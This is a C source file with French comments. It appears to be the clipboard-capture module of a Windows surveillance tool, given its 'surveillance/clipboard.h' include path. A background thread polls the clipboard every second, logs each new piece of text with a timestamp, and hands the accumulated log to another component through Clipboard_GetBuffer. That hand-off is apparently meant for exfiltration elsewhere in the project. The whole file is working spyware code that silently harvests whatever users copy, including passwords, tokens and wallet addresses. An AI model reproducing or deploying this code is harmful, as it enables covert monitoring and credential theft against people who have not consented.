/*
 * clipboard.c - Clipboard monitoring implementation
 */

#include "../../include/surveillance/clipboard.h"
#include <time.h>

/* Variables globales */
static HANDLE g_hThread = NULL;
static bool g_bRunning = false;
static CRITICAL_SECTION g_csClipboard;
static char* g_pBuffer = NULL;
static size_t g_dwBufferSize = 0;
static DWORD g_dwLastSeq = 0;

/* Constantes internes */
#define CLIPBOARD_POLL_INTERVAL_MS  1000
#define THREAD_WAIT_TIMEOUT_MS      2000
#define TIMESTAMP_BUFFER_SIZE       32
#define FORMAT_EXTRA_LEN            24  /* "[TIMESTAMP] [CLIPBOARD] \n\0" */

/* Initialise la section critique à la première utilisation */
static void EnsureInitialized(void) {
    static bool initialized = false;
    if (!initialized) {
        InitializeCriticalSection(&g_csClipboard);
        initialized = true;
    }
}

/* Ajoute du texte au buffer interne avec un timestamp */
static void AppendToBuffer(const char* text) {
    if (!text || strlen(text) == 0) return;

    EnterCriticalSection(&g_csClipboard);

    time_t now = time(NULL);
    struct tm* tm_info = localtime(&now);
    char timestamp[TIMESTAMP_BUFFER_SIZE];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);

    /* Format: [TIMESTAMP] [CLIPBOARD] <content>\n */
    size_t new_len = strlen(text) + strlen(timestamp) + FORMAT_EXTRA_LEN;
    
    if (g_pBuffer == NULL) {
        g_pBuffer = (char*)malloc(new_len);
        if (g_pBuffer) {
            snprintf(g_pBuffer, new_len, "[%s] [CLIPBOARD] %s\n", timestamp, text);
            g_dwBufferSize = strlen(g_pBuffer);
        }
    } else {
        char* new_ptr = (char*)realloc(g_pBuffer, g_dwBufferSize + new_len);
        if (new_ptr) {
            g_pBuffer = new_ptr;
            snprintf(g_pBuffer + g_dwBufferSize, new_len, "[%s] [CLIPBOARD] %s\n", timestamp, text);
            g_dwBufferSize += strlen(g_pBuffer + g_dwBufferSize);
        }
    }

    LeaveCriticalSection(&g_csClipboard);
}

/* Fonction du thread de surveillance */
static DWORD WINAPI ClipboardThread(LPVOID lpParam) {
    UNUSED(lpParam);

    g_dwLastSeq = GetClipboardSequenceNumber();

    while (g_bRunning) {
        DWORD currSeq = GetClipboardSequenceNumber();
        
        if (currSeq != g_dwLastSeq) {
            g_dwLastSeq = currSeq;

            if (OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData != NULL) {
                    char* pszText = (char*)GlobalLock(hData);
                    if (pszText != NULL) {
                        AppendToBuffer(pszText);
                        GlobalUnlock(hData);
                    }
                }
                CloseClipboard();
            }
        }
        
        Sleep(CLIPBOARD_POLL_INTERVAL_MS);
    }
    return 0;
}

bool Clipboard_Start(void) {
    EnsureInitialized();

    if (g_bRunning) return true;

    g_bRunning = true;
    g_hThread = CreateThread(NULL, 0, ClipboardThread, NULL, 0, NULL);
    
    return (g_hThread != NULL);
}

void Clipboard_Stop(void) {
    if (!g_bRunning) return;

    g_bRunning = false;
    if (g_hThread) {
        WaitForSingleObject(g_hThread, THREAD_WAIT_TIMEOUT_MS);
        CloseHandle(g_hThread);
        g_hThread = NULL;
    }
}

bool Clipboard_GetBuffer(char** buffer, DWORD* size) {
    EnsureInitialized();
    EnterCriticalSection(&g_csClipboard);

    if (g_pBuffer && g_dwBufferSize > 0) {
        *buffer = g_pBuffer;
        *size = (DWORD)g_dwBufferSize;
        
        /* Réinitialisation du buffer */
        g_pBuffer = NULL;
        g_dwBufferSize = 0;
        
        LeaveCriticalSection(&g_csClipboard);
        return true;
    }

    *buffer = NULL;
    *size = 0;
    LeaveCriticalSection(&g_csClipboard);
    return false;
}

bool Clipboard_IsRunning(void) {
    return g_bRunning;
}
